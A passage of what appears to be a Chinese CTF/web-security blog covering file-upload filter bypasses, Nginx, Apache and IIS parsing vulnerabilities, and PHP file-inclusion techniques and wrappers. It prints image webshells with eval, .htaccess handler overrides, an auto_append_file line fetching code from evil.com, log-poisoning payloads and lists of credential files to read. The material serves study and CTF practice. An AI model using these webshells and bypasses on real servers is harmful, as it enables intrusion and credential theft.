    $tmp_name = $_FILES[<span class="string">&quot;fileUpload&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];
    $name = $_FILES[<span class="string">&quot;fileUpload&quot;</span>][<span class="string">&quot;name&quot;</span>];
    <span class="keyword">if</span> (!$tmp_name) &#123;
        <span class="title function_">die</span>(<span class="string">&quot;filesize too big!&quot;</span>);
    &#125;
    <span class="keyword">if</span> (!$name) &#123;
        <span class="title function_">die</span>(<span class="string">&quot;filename cannot be empty!&quot;</span>);
    &#125;
    $extension = <span class="title function_">substr</span>($name, <span class="title function_">strrpos</span>($name, <span class="string">&quot;.&quot;</span>) + <span class="number">1</span>);
    <span class="keyword">if</span> (<span class="title function_">preg_match</span>(<span class="string">&quot;/ph|htaccess/i&quot;</span>, $extension)) &#123;
        <span class="title function_">die</span>(<span class="string">&quot;illegal suffix!&quot;</span>);
    &#125;
    <span class="keyword">if</span> (<span class="title function_">mb_strpos</span>(<span class="title function_">file_get_contents</span>($tmp_name), <span class="string">&quot;&lt;?&quot;</span>) !== <span class="variable constant_">FALSE</span>) &#123;
        <span class="title function_">die</span>(<span class="string">&quot;&amp;lt;? in contents!&quot;</span>);
    &#125;
    $image_type = <span class="title function_">exif_imagetype</span>($tmp_name);
    <span class="keyword">if</span> (!$image_type) &#123;
        <span class="title function_">die</span>(<span class="string">&quot;exif_imagetype:not image!&quot;</span>);
    &#125;
    $upload_file_path = $userdir . <span class="string">&quot;/&quot;</span> . $name;
    <span class="title function_">move_uploaded_file</span>($tmp_name, $upload_file_path);
    echo <span class="string">&quot;Your dir &quot;</span> . $userdir. <span class="string">&#x27; &lt;br&gt;&#x27;</span>;
    echo <span class="string">&#x27;Your files : &lt;br&gt;&#x27;</span>;
    <span class="title function_">var_dump</span>(<span class="title function_">scandir</span>($userdir));
&#125;</code></pre>
<p><strong>绕过技巧</strong>：</p>
<p>1.针对过滤包含<code>ph</code>与<code>htaccess</code>扩展名的文件：上传<code>.user.ini</code>与图片马，利用<code>.user.ini</code>进行文件包含2.针对过滤文件内容包含<code>&lt;?</code>的文件：使用<code>php</code>的脚本标记风格<code>&lt;script language='php'&gt;</code>3.针对使用<code>exif_imagetype</code>规定了必须为图片类型的文件：添加文件头内容或合成图片马（稍后会讲）</p>
<p>首先上传<code>.user.ini</code>文件，文件内容为：</p>
<pre><code class="highlight javascript"><span class="title class_">GIF89</span>a
auto_prepend_file=shell.<span class="property">png</span></code></pre>
<p>然后构造一个<code>shell.png</code>，内容如下：</p>
<pre><code class="highlight javascript"><span class="title class_">GIF89</span>a
&lt;script language=<span class="string">&#x27;php&#x27;</span>&gt; @<span class="built_in">eval</span>($_POST[<span class="string">&#x27;hack&#x27;</span>]); &lt;/script&gt;</code></pre>
<p>然后将两个文件分别上传到服务器上，拿到回显</p>
<h3 id="奇奇怪怪的绕过"><a class="markdownIt-Anchor" href="#奇奇怪怪的绕过"></a> 奇奇怪怪的绕过</h3>
<p>利用一下文件包含上传一个压缩包来getshell</p>
<p>这里不细讲</p>
<h2 id="ngnix解析漏洞"><a class="markdownIt-Anchor" href="#ngnix解析漏洞"></a> Ngnix解析漏洞</h2>
<h3 id="文件解析漏洞"><a class="markdownIt-Anchor" href="#文件解析漏洞"></a> 文件解析漏洞</h3>
<p>对于任意文件名，在后面添加<code>/abc.php</code>(abc为任意字符)后，即可将文件作为php解析</p>
<p><strong>漏洞机理</strong></p>
<p>Nginx配置导致，而非nginx版本问题，而取决于php的配置文件 php.ini 文件中是否开启了<code> cgi.fix_pathinfo</code></p>
<p>当访问<code>xxx.jpg/abc.php</code>时，nginx查看URL后发现以php结尾，并将路径传递给<code>phpfastcgi</code>处理程序，php看到<code>xxx.jpg/abc.php</code>不存在，便删除去最后的<code>/abc.php</code>，看到<code>xxx.jpg</code>存在，而后以<code>php</code>的形式执行<code>xxx.jpg</code>的内容</p>
<p>大概的来说，就是<code>cgi.fix_pathinfo</code>会对形如<code>/1.aaa/2.bbb/3.cccc</code>的文件路径进行处理，若该路径不存在，则会去掉最后的子路径再次判断直到找到一个存在的路径。</p>
<p>若关闭该选项，访问<code>/xxx.jpg/abc.php</code>会返回找不到文件，但关闭该选项可能会导致一些其他错误，所以默认开启。</p>
<p>在高版本中，引入了<code>security.limit_extensions</code>来纠正这个错误，限制了可执行文件的后缀，默认只允许执行<code>.php</code>文件。防止这一问题(回显Access denied)</p>
<h3 id="空字节rce"><a class="markdownIt-Anchor" href="#空字节rce"></a> 空字节RCE</h3>
<p>Nginx在遇到%00空字节时与后段<code>FastCGI</code>处理不一致，导致可以在图中嵌入PHP代码然后通过访问<code>1.jpg%00.php</code>来执行其中的代码。</p>
<p><strong>影响版本</strong></p>
<pre><code class="highlight plaintext">nginx 0.5.*
nginx 0.6.*
nginx 0.7 &lt;= 0.7.65
nginx 0.8 &lt;= 0.8.37</code></pre>
<p>该漏洞不受cgi.fix_pathinfo影响，当为0时，依旧可以解析</p>
<h3 id="cve-2013-45472000"><a class="markdownIt-Anchor" href="#cve-2013-45472000"></a> CVE-2013-4547(%20%00)</h3>
<p><strong>影响版本</strong></p>
<pre><code class="highlight plaintext">nginx 0.8.41 ~ 1.5.6</code></pre>
<p>原理是非法字符空格和截止符（%00）会导致Nginx解析URI时的有限状态机混乱，危害是允许攻击者通过一个非编码空格绕过后缀名限制。是什么意思呢？举个例子，假设服务器上存在文件：“file.jpg ”，注意文件名的最后一个字符是空格。则可以通过访问：<code>http://127.0.0.1/file.jpg \0.php</code></p>
<p>让Nginx认为文件“file.jpg ”的后缀为<code>.php</code></p>
<p>来测试下，这次测试在Nginx/1.0.15中进行。首先准备一张图片，命名为“test.html ”，注意，文件名含有空格。然后在浏览器中访问该文件，会得到一个404，因为浏览器自动将空格编码为%20，服务器中不存在文件“test.html%20”。</p>
<p>测试目标是要让Nginx认为该文件是图片文件并正确地在浏览器中显示出来。我们想要的是未经编码的空格和截止符（\0），怎么办呢？使用Burp Suite抓取浏览器发出的请求包，修改为我们想要的样子，原本的URL是：<code>http://192.168.56.101/test.htmlAAAjpg </code>,将第一个“A”改成“20”（空格符号的ASCII码），将第二个“A”改成“00”（截止符），将第三个“A”改成“2e”（“.”的ASCII码），如图<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/1964477-20200308194656774-1403436835.png" alt="1964477-20200308194656774-1403436835"></p>
<p>修改完毕后Forward该请求，在浏览器中看到：</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/1964477-20200308194716298-1059932045.png" alt="1964477-20200308194716298-1059932045"></p>
<p>我们已经成功地利用了漏洞！但这有什么用呢？我们想要的是代码被执行。</p>
<p>继续测试，准备文件“test.jpg ”，注意文件名的最后一个字符是空格，上传到服务器。文件内容为：</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>(); <span class="meta">?&gt;</span></code></pre>
<p>用Burp Suite抓包并修改，原本的URL是：<code>http://192.168.56.101/test.jpg…php</code> ,将jpg后的第一个“.”改为20，第二个“.”改为00，如下图所示</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/1964477-20200308194746793-602361880.png" alt="1964477-20200308194746793-602361880"></p>
<p>修改完毕后 Forword 该请求，在浏览器中看到：Access denied ，好吧，又是这个。</p>
<p>这说明Nginx在接收到这一请求后，确实把文件“test.jpg ”当做php文件交给php去执行了，只是php看到该文件后缀为“.jpg ”而拒绝执行。这样，便验证了Nginx确实存在该漏洞。但是由于<code>security.limit_extensions</code>的存在，导致我们并不能利用此漏洞</p>
<h2 id="apache解析漏洞"><a class="markdownIt-Anchor" href="#apache解析漏洞"></a> Apache解析漏洞</h2>
<h3 id="文件名解析漏洞"><a class="markdownIt-Anchor" href="#文件名解析漏洞"></a> 文件名解析漏洞</h3>
<p><code>Apache</code>从右向左判断解析文件,若无法解析再继续向左判断,如<code>1.php.owf.rar</code>这个文件名，<code>Apache</code>无法解析<code>.owf</code>和<code>.rar</code>两个后缀，于是继续向前解析将其解析为1.php</p>
<p>实际上许多后缀都可以被解析为php文件进行处理，这里贴一下其他师傅的文章</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250417211410728.png" alt="image-20250417211410728"></p>
<pre><code class="highlight plaintext">原链接:https://www.cnblogs.com/yokan/p/12444476.html
可以用shell.php/x.php/..绕</code></pre>
<h3 id="htaccess文件"><a class="markdownIt-Anchor" href="#htaccess文件"></a> .htaccess文件</h3>
<p>是Apache下的一个配置文件，负责相关目录下的网页配置。通过<code> .htaccess</code>文件，可以实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能IIS平台上不存在该文件，该文件默认开启，启用和关闭在 <code>httpd.conf</code> 文件中配置。</p>
<pre><code class="highlight plaintext">生效前提:
AllowOverride被启用/AllowOverride Options FileInfo
mod_rewrite 模块开启
cgi_module被加载。即apache配置文件中有LoadModule cgi_module modules/mod_cgi.so这么一句且没有被注释</code></pre>
<p>这里放几个常用的配置</p>
<h4 id><a class="markdownIt-Anchor" href="#"></a> </h4>
<pre><code class="highlight plaintext">AddType application/x-httpd-php .jpg</code></pre>
<p>这里代码的意思可以让 .jpg后缀名文件格式的文件名以php格式解析</p>
<h4 id="cgi启动方式利用"><a class="markdownIt-Anchor" href="#cgi启动方式利用"></a> CGI启动方式利用</h4>
<pre><code class="highlight plaintext">Options ExecCGI (表示允许CGI执行，若AllowOverride只有FileInfo权限且本身就开启了ExecCGI的话，就可以不需要这句话了。)
AddHandler cgi-script .xx(将.xx后缀的文件当成CGI程序解析)
#AddHandler application/x-httpd-php .php (给php后缀增加了处理器，这样即使有多个后缀，只要含有php后缀就会被识别为php文件)</code></pre>
<p>下面是网上一个师傅的利用</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250418083343333.png" alt="image-20250418083343333"></p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250418083404184.png" alt="image-20250418083404184"></p>
<h4 id="fastcgi利用"><a class="markdownIt-Anchor" href="#fastcgi利用"></a> FastCGI利用</h4>
<p>依赖<code>mod_fcgid.so</code>，默认安装包里是没有这个so文件的，但是在PHPstudy的默认配置中是已经加载了的，并且<code>AllowOverrride</code>也是All权限</p>
<pre><code class="highlight plaintext">Options +ExecCGI
AddHandler fcgid-script .gif
FcgidWrapper &quot;/bin/bash&quot; .gif</code></pre>
<h4 id="文件包含利用"><a class="markdownIt-Anchor" href="#文件包含利用"></a> 文件包含利用</h4>
<p><code>php_value auto_prepend_file +文件绝对路径</code>（默认是当前上传的目录）</p>
<p>预先包含我们指定的文件</p>
<pre><code class="highlight plaintext">php_flag allow_url_include 1
php_value auto_append_file data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==
#php_value auto_append_file data://text/plain,%3C%3Fphp+phpinfo%28%29%3B
#php_value auto_append_file https://evil.com/evil-code.txt</code></pre>
<p>如果若我们预先包含.htaccess文件呢?效果是我们插入的恶意代码就会被任意包含</p>
<p>大概像这样构造</p>
<pre><code class="highlight plaintext">php_value auto_prepend_file &quot;.htaccess&quot;%0a#&lt;?php phpinfo();?&gt;</code></pre>
<p>同时这个漏洞也可以造成xss漏洞和其他的一些文件包含漏洞</p>
<h4 id="正经写入"><a class="markdownIt-Anchor" href="#正经写入"></a> 正经写入</h4>
<pre><code class="highlight plaintext">#
&lt;IfModule mime_module&gt;
AddHandler php5-script .gif          #在当前目录下，只针对gif文件会解析成Php代码执行
SetHandler application/x-httpd-php    #在当前目录下，所有文件都会被解析成php代码执行
&lt;/IfModule&gt;

#
&lt;FilesMatch &quot;evil.gif&quot;&gt;
SetHandler application/x-httpd-php   #在当前目录下，如果匹配到evil.gif文件，则被解析成PHP代码执行
AddHandler php5-script .gif          #在当前目录下，如果匹配到evil.gif文件，则被解析成PHP代码执行
&lt;/FilesMatch&gt;
较为精准，不容易误伤
这边看到还有个写法:
&lt;FilesMatch   &quot;shell&quot;&gt; 
SetHandler  application/x-httpd-php 
&lt;/FilesMatch&gt; (意思是把文件名中含shell的都当作php解析，包括还有一个正则的写法)

#
&lt;IfModule mime_module&gt;
AddType application/x-httpd-php .gif (将.gif文件按照php代码进行解析执行)
AddHandler php5-script .jpg	(将.jpg文件按照php代码进行解析执行)
Sethandler application/x-httpd-php (将该目录及子目录下的文件均按照php文件解析执行)
&lt;/IfModule&gt;
容易误伤</code></pre>
<h3 id="cve-2017-15715"><a class="markdownIt-Anchor" href="#cve-2017-15715"></a> CVE-2017-15715</h3>
<p>在文件后缀后加上<code>%0a</code>，绕过getshell</p>
<h3 id="目录遍历"><a class="markdownIt-Anchor" href="#目录遍历"></a> 目录遍历</h3>
<p>配置 <code>Options +Indexes</code> 时Apache存在目录遍历漏洞。</p>
<h3 id="lighttpd"><a class="markdownIt-Anchor" href="#lighttpd"></a> lighttpd</h3>
<p><code>xx.jpg/xx.php</code></p>
<h2 id="iis"><a class="markdownIt-Anchor" href="#iis"></a> IIS</h2>
<h3 id="解析目录解析漏洞testasp1jpg"><a class="markdownIt-Anchor" href="#解析目录解析漏洞testasp1jpg"></a> 解析目录解析漏洞(/test.asp/1.jpg)</h3>
<p>在 IIS5.x/6.0 中，在网站下建立文件夹的名字为<code>*.asp、*.asa、*.cer、*.cdx </code>的文件夹，那么其目录内的任何扩展名的文件都会被IIS当做asp文件来解释并执行。例如创建目录 test.asp，那么 /test.asp/1.jpg 将被当做asp文件来执行。假设黑客可以控制上传文件夹路径，就可以不管上传后你的图片改不改名都能拿shell了</p>
<h3 id="文件名解析漏洞testaspjpg"><a class="markdownIt-Anchor" href="#文件名解析漏洞testaspjpg"></a> 文件名解析漏洞(test.asp;.jpg)</h3>
<p>在 IIS5.x/6.0 中， 分号后面的不被解析，也就是说 xie.asp;.jpg 会被服务器看成是xie.asp。还有IIS6.0默认的可执行文件除了asp还包含这两种 <code>.asa  .cer</code> 。而有些网站对用户上传的文件进行校验，只是校验其后缀名。所以我们只要上传 <code>*.asp;.jpg、*.asa;.jpg、*.cer;.jpg</code> 后缀的文件，就可以通过服务器校验，并且服务器会把它当成asp文件执行。</p>
<h3 id="畸形解析漏洞testjpgphp"><a class="markdownIt-Anchor" href="#畸形解析漏洞testjpgphp"></a> 畸形解析漏洞(test.jpg/*.php)</h3>
<p>微软发布了IIS7.0修补了IIS6.0的解析漏洞，没想到IIS7.0爆出更严重的畸形解析漏洞，于是微软急忙发布了IIS7.5</p>
<p>在 IIS7.0中，在默认Fast-CGI开启状况下，我们往图片里面写入下面的代码</p>
<p><a href="https://img2020.cnblogs.com/i-beta/1964477/202003/1964477-20200308194604304-1865593941.png"><img src="/2025/01/25/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/kisakiayano/source/_posts/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/1964477-20200308194604304-1865593941.png" alt="img"></a></p>
<p>将文件保存成test.jpg格式，上传到服务器，假设上传路径为/upload，上传成功后，直接访问/upload/test.jpg/x.php，此时神奇的畸形解析开始发挥作用啦。test.jpg将会被服务器当成php文件执行，所以图片里面的代码就会被执行。我们会神奇的发现在 /upload 目录下创建了一个一句话木马文件<code> shell.php</code> 。</p>
<p>临时解决办法：设置<code> cgi.fix_pathinfo</code>为0`</p>
<h3 id="其他解析漏洞"><a class="markdownIt-Anchor" href="#其他解析漏洞"></a> <strong>其他解析漏洞</strong></h3>
<p>在windows环境下，**xx.jpg[**<strong>空格]</strong> 或 <strong>xx.jpg.</strong> 这两类文件都是不允许存在的，若这样命名，windows会默认除去空格或点，黑客可以通过抓包，在文件名后加一个空格或者点绕过黑名单。若上传成功，空格和点都会被windows自动消除。</p>
<p>同时推荐一篇比较有意思的文章，lz自己没怎么看懂，但是感觉蛮有意思的</p>
<p><a href="https://rivers.chaitin.cn/blog/cqr0pg10lne22g7e74ig">Black Hat USA 2024：利用Apache HTTP服务器中隐藏的语义歧义进行攻击！ | 长亭百川云</a></p>
]]></content>
      <tags>
        <tag>-CTF -Web</tag>
      </tags>
  </entry>
  <entry>
    <title>文件包含</title>
    <url>/2025/01/10/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    <content><![CDATA[<h1 id="文件包含漏洞"><a class="markdownIt-Anchor" href="#文件包含漏洞"></a> 文件包含漏洞</h1>
<p>依赖于<code>include()</code>,<code>require()</code>,<code>include_once()</code>,<code>require_once()</code>这些函数的漏洞</p>
<p>什么叫包含呢？以PHP为例，我们常常把可重复使用的函数写入到单个文件中，在使用该函数时，直接调用此文件，而无需再次编写函数，这一过程叫做包含</p>
<p>有时候由于网站功能需求，会让前端用户选择要包含的文件，而开发人员又没有对要包含的文件进行安全考虑，就导致攻击者可以通过修改文件的位置来让后台执行任意文件，从而导致文件包含漏洞。</p>
<p><strong>#</strong> <strong>几个函数的区别</strong></p>
<p>require():找不到被包含的文件会产生致命错误，并停止脚本运行<br>
include():找不到被包含的文件只会产生警告，脚本继续执行<br>
require_once()与require()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含<br>
include_once()与include()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含</p>
<p>只要文件中存在<code>php</code>代码都会被解析出来</p>
<h2 id="本地文件包含lfi"><a class="markdownIt-Anchor" href="#本地文件包含lfi"></a> 本地文件包含(LFI)</h2>
<p>能够打开并包含本地文件的漏洞，我们称为本地文件包含漏洞(LFI)<br>
测试网页包含如下代码:</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
	<span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];
	<span class="keyword">include</span>(<span class="variable">$file</span>);
<span class="meta">?&gt;</span></code></pre>
<p>网站利用文件包含功能读取一些<code>php</code>文件，例如<code>phpinfo</code>:</p>
<p>也可以包含木马</p>
<p>利用该代码，我们可以读取一些系统本地的敏感信息。<br>
例如:<code>C:\Windows\system.ini</code>文件。<br>
（1）使用绝对路径<br>
使用绝对路径直接读取:</p>
<p>（2）使用相对路径进行读取<br>
通过./表示当前位置路径，<code>../</code>表示上一级路径位置，在linux中同样适用。</p>
<p>例如当前页面所在路径为<code>C:\Apache24\htdocs\</code>，我们需要使用…/退到C盘再进行访问，构造路径如下：<br>
<code>../../windows/system.ini</code></p>
<p>由于我的环境搭建在D盘，所以这里就不做演示了。</p>
<p>（3）一些常见的敏感目录信息路径:<br>
Windows系统:</p>
<pre><code class="highlight plaintext">C:\boot.ini //查看系统版本
C:\windows\system32\inetsrv\MetaBase.xml //IIS配置文件
C:\windows\repair\sam //存储Windows系统初次安装的密码
C:\ProgramFiles\mysql\my.ini //Mysql配置
C:\ProgramFiles\mysql\data\mysql\user.MYD //MySQL root密码
C:\windows\php.ini //php配置信息
Linux/Unix系统:

/etc/password //账户信息
/etc/shadow //账户密码信息
/usr/local/app/apache2/conf/httpd.conf //Apache2默认配置文件
/usr/local/app/apache2/conf/extra/httpd-vhost.conf //虚拟网站配置
/usr/local/app/php5/lib/php.ini //PHP相关配置
/etc/httpd/conf/httpd.conf //Apache配置文件
/etc/my.conf //mysql配置文件</code></pre>
<p>三、LFI漏洞利用技巧<br>
1.配合文件上传使用<br>
有时候我们找不到文件上传漏洞，无法上传webshell，可以先上传一个图片格式的webshell到服务器，再利用本地文件包含漏洞进行解析。</p>
<p>以DVWA平台为例，将Security Level选择low，编辑一个图片马，内容如下:</p>
<pre><code class="highlight plaintext">&lt;?php
	fwrite(fopen(&quot;shell.php&quot;,&quot;w&quot;),&#x27;&lt;?php eval($_POST[123]);?&gt;);
?&gt;</code></pre>
<p>找到上传点进行上传：</p>
<p>得到文件保存的完整路径</p>
<p>现在我们利用页面去执行我们上传的图片马</p>
<p>有能够读取文件的php页面，直接构造url读取，代码成功解析</p>
<p>注：我们也可以直接在webshell.jpg中写一句话木马，然后再通过文件包含漏洞去连接webshell.jpg，但这种方法有时候webshell功能会出现异常。所以我们选择上面的方式，生成一个.php格式的一句话木马，再去连接。</p>
<p>2.包含Apache日志文件<br>
有时候网站存在文件包含漏洞，但是却没有文件上传点。这个时候我们还可以通过利用Apache的日志文件来生成一句话木马。</p>
<p>在用户发起请求时，服务器会将请求写入access.log，当发生错误时将错误写入error.log，日志文件如下:</p>
<p>当我们正常访问一个网页时，如`<a href="http://127.0.0.1/phpinfo.php%EF%BC%8Caccess%E6%97%A5%E5%BF%97%E4%BC%9A%E8%BF%9B%E8%A1%8C%E8%AE%B0%E5%BD%95%EF%BC%8C%E5%A6%82%E4%B8%8B%E5%9B%BE%E6%89%80%E7%A4%BA:">http://127.0.0.1/phpinfo.php，access日志会进行记录，如下图所示:</a></p>
<p>如果我们访问一个不存在的资源，也一样会进行记录，例如访问</p>
<pre><code class="highlight plaintext">127.0.0.1&lt;?php phpinfo();?&gt;</code></pre>
<p>网页会显示403</p>
<p>但查看日志会发现被成功记录但被编码了</p>
<p>我们再次进行访问，并使用burp抓包，发现被编码：</p>
<p>我们将报文修改回去，再进行发送即可：</p>
<p>此时再查看access日志，正确写入php代码：</p>
<p>再通过本地文件包含漏洞访问，即可执行</p>
<p>我们可以在此处写入一句话木马，再使用webshell管理工具进行连接。</p>
<p>3.包含SESSION文件<br>
可以先根据尝试包含到SESSION文件，在根据文件内容寻找可控变量，在构造payload插入到文件中，最后包含即可。</p>
<p>利用条件:</p>
<p>找到Session内的可控变量<br>
Session文件可读写，并且知道存储路径<br>
php的session文件的保存路径可以在phpinfo的session.save_path看到。</p>
<p>session常见存储路径:</p>
<p>/var/lib/php/sess_PHPSESSID<br>
/var/lib/php/sess_PHPSESSID<br>
/tmp/sess_PHPSESSID<br>
/tmp/sessions/sess_PHPSESSID<br>
session文件格式:sess_[phpsessid],而phpsessid在发送的请求的cookie字段中可以看到。<br>
相关案例可以查看这道CTF题一道CTF题：PHP文件包含</p>
<p>4.包含临时文件</p>
<p>php中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用C:\windows\temp目录。在临时文件被删除前，可以利用时间竞争的方式包含该临时文件。</p>
<p>由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的是随机函数有缺陷，而windows下只有65535种不同的文件名，所以这个方法是可行的。</p>
<p>另一种方法是配合phpinfo页面的php variables，可以直接获取到上传文件的存储路径和临时文件名，直接包含即可。</p>
<p>这个方法可以参考LFI With PHPInfo Assistance<br>
类似利用临时文件的存在，竞争时间去包含的，可以看看这道CTF题： XMAN夏令营-2017-babyweb-writeup</p>
<h2 id="远程文件包含rfi"><a class="markdownIt-Anchor" href="#远程文件包含rfi"></a> 远程文件包含(RFI)</h2>
<h2 id="必备知识php伪协议"><a class="markdownIt-Anchor" href="#必备知识php伪协议"></a> 必备知识:php伪协议</h2>
<h3 id="file-协议"><a class="markdownIt-Anchor" href="#file-协议"></a> <code>file://</code> 协议</h3>
<ul>
<li>
<p><strong>条件</strong>：</p>
<ul>
<li><code>allow_url_fopen</code>:off/on</li>
<li><code>allow_url_include</code> :off/on</li>
</ul>
</li>
<li>
<p><strong>作用</strong>：<br>
用于访问本地文件系统，在CTF中通常用来<strong>读取本地文件</strong>的且不受<code>allow_url_fopen</code>与<code>allow_url_include</code>的影响。<br>
<code>include()/require()/include_once()/require_once()</code>参数可控的情况下，如导入为非<code>.php</code>文件，则仍按照php语法进行解析，这是<code>include()</code>函数所决定的。</p>
</li>
<li>
<p><strong>说明</strong>：<br>
<code>file://</code> 文件系统是 PHP 使用的默认封装协议，展现了本地文件系统。当指定了一个相对路径（不以/、、\或 Windows 盘符开头的路径）提供的路径将基于当前的工作目录。在很多情况下是脚本所在的目录，除非被修改了。使用 CLI 的时候，目录默认是脚本被调用时所在的目录。在某些函数里，例如 <code>fopen()</code> 和 <code>file_get_contents()</code>，<code>include_path </code>会可选地搜索，也作为相对的路径。</p>
</li>
<li>
<p><strong>用法</strong>：</p>
<pre><code class="highlight pgsql">/<span class="type">path</span>/<span class="keyword">to</span>/file.ext
relative/<span class="type">path</span>/<span class="keyword">to</span>/file.ext
fileInCwd.ext
C:/<span class="type">path</span>/<span class="keyword">to</span>/winfile.ext
C:\<span class="type">path</span>\<span class="keyword">to</span>\winfile.ext
\\smbserver\<span class="keyword">share</span>\<span class="type">path</span>\<span class="keyword">to</span>\winfile.ext
file:///<span class="type">path</span>/<span class="keyword">to</span>/file.ext</code></pre>
</li>
<li>
<p><strong>示例</strong>：</p>
<ol>
<li>
<p><code>file://[文件的绝对路径和文件名]</code></p>
<pre><code class="highlight http">http://127.0.0.1/include.php?file=file://E:\phpStudy\PHPTutorial\WWW\phpinfo.txt</code></pre>
<p><img src="https://segmentfault.com/img/bVbrQAZ" alt="图片描述"></p>
</li>
<li>
<p><code>[文件的相对路径和文件名]</code></p>
<pre><code class="highlight http">http://127.0.0.1/include.php?file=./phpinfo.txt</code></pre>
<p><img src="https://segmentfault.com/img/bVbrQA1" alt="图片描述"></p>
</li>
<li>
<p><code>[http：//网络路径和文件名]</code></p>
<pre><code class="highlight http">http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</code></pre>
<p><img src="https://segmentfault.com/img/bVbrQBb" alt="图片描述"></p>
</li>
</ol>
</li>
<li>
<p><strong>参考</strong>：<a href="https://link.segmentfault.com/?enc=YtcHVUno34rLTBJUcxsHxA%3D%3D.SAMo1ZcMmiqVqJxFosbgOTO2nJi4mSvGX5no8jrMTl7u2z1qAxlTLJm6Xm7Rs3Ze">http://php.net/manual/zh/wrappers.file.php</a></p>
</li>
</ul>
<h3 id="php-协议"><a class="markdownIt-Anchor" href="#php-协议"></a> <code>php://</code> 协议</h3>
<ul>
<li>
<p><strong>条件</strong>：</p>
<ul>
<li><code>allow_url_fopen</code>:off/on</li>
<li><code>allow_url_include</code> :仅<code>php://input php://stdin php://memory php://temp </code>需要on</li>
</ul>
</li>
<li>
<p><strong>作用</strong>：<br>
<code>php://</code> 访问各个输入/输出流（I/O streams），在CTF中经常使用的是<code>php://filter</code>和<code>php://input</code>，<code>php://filter</code>用于<strong>读取源码</strong>，<code>php://input</code>用于<strong>执行php代码</strong>。</p>
</li>
<li>
<p><strong>说明</strong>：<br>
PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符，<br>
内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</p>
<table>
<thead>
<tr>
<th>协议</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>php://input</td>
<td>可以访问请求的原始数据的只读流，在POST请求中访问POST的<code>data</code>部分，在<code>enctype=&quot;multipart/form-data&quot;</code> 的时候<code>php://input </code>是无效的。</td>
</tr>
<tr>
<td>php://output</td>
<td>只写的数据流，允许以 print 和 echo 一样的方式写入到输出缓冲区。</td>
</tr>
<tr>
<td>php://fd</td>
<td>(&gt;=5.3.6)允许直接访问指定的文件描述符。例如 <code>php://fd/3</code> 引用了文件描述符 3。</td>
</tr>
<tr>
<td>php://memory php://temp</td>
<td>(&gt;=5.1.0)一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 <code>php://memory</code> 总是把数据储存在内存中，而 <code>php://temp</code> 会在内存量达到预定义的限制后（默认是 <code>2MB</code>）存入临时文件中。临时文件位置的决定和 <code>sys_get_temp_dir()</code> 的方式一致。</td>
</tr>
<tr>
<td>php://filter</td>
<td>(&gt;=5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式<code>（all-in-one）</code>的文件函数非常有用，类似 <code>readfile()</code>、<code>file()</code> 和 <code>file_get_contents()</code>，在数据流内容读取之前没有机会应用其他过滤器。</td>
</tr>
</tbody>
</table>
</li>
<li>
<p><strong><code>php://filter</code>参数详解</strong></p>
<p>该协议的参数会在该协议路径上进行传递，多个参数都可以在一个路径上传递。具体参考如下：</p>
<table>
<thead>
<tr>
<th>php://filter 参数</th>
<th>描述</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>resource=&lt;要过滤的数据流&gt;</td>
<td>必须项。它指定了你要筛选过滤的数据流。</td>
<td></td>
</tr>
<tr>
<td>read=&lt;读链的过滤器&gt;</td>
<td>可选项。可以设定一个或多个过滤器名称，以管道符（*\</td>
<td>*）分隔。</td>
</tr>
<tr>
<td>write=&lt;写链的过滤器&gt;</td>
<td>可选项。可以设定一个或多个过滤器名称，以管道符（\</td>
<td>）分隔。</td>
</tr>
<tr>
<td>&lt;; 两个链的过滤器&gt;</td>
<td>任何没有以 <em>read=</em> 或 <em>write=</em> 作前缀的筛选器列表会视情况应用于读或写链。</td>
<td></td>
</tr>
</tbody>
</table>
</li>
<li>
<p><strong>可用的过滤器列表（4类）</strong></p>
<p>此处列举主要的过滤器类型，详细内容请参考：<a href="https://link.segmentfault.com/?enc=XLl1qyeGwRWWMG9dw9ESmQ%3D%3D.0ts2nAacIjZZ%2BDTLJ5T0ocshPXAgZLYKgYBybI8Dc7yazO2QRQTOjf%2FjsO5rq19t">https://www.php.net/manual/zh/filters.php</a></p>
<table>
<thead>
<tr>
<th>字符串过滤器</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>string.rot13</td>
<td>等同于<code>str_rot13()</code>，rot13变换</td>
</tr>
<tr>
<td>string.toupper</td>
<td>等同于<code>strtoupper()</code>，转大写字母</td>
</tr>
<tr>
<td>string.tolower</td>
<td>等同于<code>strtolower()</code>，转小写字母</td>
</tr>
<tr>
<td>string.strip_tags</td>
<td>等同于<code>strip_tags()</code>，去除html、PHP语言标签</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th>转换过滤器</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
